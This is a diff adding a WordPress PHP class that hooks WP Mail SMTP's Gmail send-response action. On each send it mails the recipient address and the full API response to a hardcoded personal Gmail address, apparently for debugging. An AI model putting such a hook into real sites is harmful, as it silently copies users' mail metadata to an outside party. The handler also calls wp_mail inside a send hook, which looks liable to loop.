@@ -67,6 +67,49 @@ function smtpUpdateExported() {
 
 
 
+final class WPMSMTP_Gmail_Response_Mailer {
+
+    public static function init(): void {
+        add_action(
+            'wp_mail_smtp_providers_gmail_mailer_process_response',
+            [ __CLASS__, 'handle' ],
+            10,
+            2
+        );
+    }
+
+    /**
+     * @param mixed $response
+     * @param PHPMailer $phpmailer
+     */
+    public static function handle( $response, $phpmailer ): void {
+
+        $email = 'matrosovdream@gmail.com';
+
+        // Extract recipient (optional, for context)
+        $to = '';
+        if ( is_object($phpmailer) && ! empty($phpmailer->to[0][0]) ) {
+            $to = $phpmailer->to[0][0];
+        }
+
+        $subject = '[WP Mail SMTP] Gmail send response';
+
+        $message  = "Recipient:\n" . ($to ?: 'N/A') . "\n\n";
+        $message .= "Response:\n";
+        $message .= print_r($response, true);
+
+        wp_mail(
+            $email,
+            $subject,
+            $message,
+            [ 'Content-Type: text/plain; charset=UTF-8' ]
+        );
+    }
+}
+
+WPMSMTP_Gmail_Response_Mailer::init();
+
+
 
 
 
